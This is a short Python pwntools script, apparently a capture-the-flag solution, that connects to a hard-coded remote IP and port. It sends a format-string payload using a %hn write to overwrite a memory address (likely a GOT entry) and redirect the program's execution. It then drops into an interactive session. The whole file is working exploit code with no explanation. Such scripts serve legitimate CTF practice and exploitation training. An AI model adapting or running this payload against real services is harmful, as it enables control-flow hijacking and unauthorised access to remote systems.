from pwn import *

def arb_write():
    io = remote("18.212.136.134", 1337)

    # 000 010 020 030 040 048 050
    payload = f'%{0x11c6}c%8$hn'.encode()
    payload = payload.ljust(0x10, b'\x41')
    payload += flat(0x404048) + flat(0x0)
 
    io.sendlineafter(b'say: ', payload)
    io.interactive()

arb_write()